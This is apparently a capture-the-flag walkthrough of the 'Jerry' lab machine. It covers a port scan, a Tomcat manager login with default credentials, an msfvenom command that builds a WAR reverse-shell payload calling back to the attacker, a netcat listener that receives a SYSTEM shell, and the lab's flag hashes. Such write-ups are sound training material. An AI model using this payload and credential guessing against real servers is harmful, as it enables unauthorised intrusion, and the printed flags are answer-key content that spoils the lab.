![Jerry.PNG](/assets/Machines/Easy/Jerry/Jerry.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.95
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.95
```

**Output**
```bash
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Jerry/web.PNG)

* Running Apache Tomcat

4. Go to `manager`

![manager.PNG](/assets/Machines/Easy/Jerry/manager.PNG)

5. Put default credentials **username:** `admin` & **password:** `admin`

![output.PNG](/assets/Machines/Easy/Jerry/output.PNG)

6. In script example put: 
* **username:** `tomcat` & **password:** `s3cret`

* Try to login with this credentials. (I know this credentials are example, but, try it)

7. Close navigator and go to `manager` **again**

![try.PNG](/assets/Machines/Easy/Jerry/try.PNG)

**Output**

![output2.PNG](/assets/Machines/Easy/Jerry/output2.PNG)

8. We try to upload war file malicious, use msfvenom to create this.

* First, search java payload
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Jerry]
└─| msfvenom -l payloads | grep java
```

**Output**
```bash
java/jsp_shell_bind_tcp                        Listen for a connection and spawn a command shell
java/jsp_shell_reverse_tcp                     Connect back to attacker and spawn a command shell
java/meterpreter/bind_tcp                      Run a meterpreter server in Java. Listen for a connection
java/meterpreter/reverse_http                  Run a meterpreter server in Java. Tunnel communication over HTTP
java/meterpreter/reverse_https                 Run a meterpreter server in Java. Tunnel communication over HTTPS
java/meterpreter/reverse_tcp                   Run a meterpreter server in Java. Connect back stager
java/shell/bind_tcp                            Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
java/shell/reverse_tcp                         Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
java/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
```
---
* We use `java/jsp_shell_reverse_tcp` payload, now we go to configure this.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Jerry]
└─| msfvenom -p java/jsp_shell_reverse_tcp LHOST=<tun0 IP> LPORT=443 -f war -o <name file .war>
```

**Output**

![war.PNG](/assets/Machines/Easy/Jerry/war.PNG)


9. Upload **.war file** on web

* In this part 

![war_web.PNG](/assets/Machines/Easy/Jerry/war_web.PNG)

10. In part of **Applications** we can watch our war file (In mi case `/shell`)

![app.PNG](/assets/Machines/Easy/Jerry/app.PNG)

11. Click on your name of application, before, listen with netcat in port choosed

**Output**
```cmd
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Jerry]
└─# nc -lvnp 443                                          
listening on [any] 443 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

12. Cat the flags
```cmd
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,896,320 bytes free
```


```cmd
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```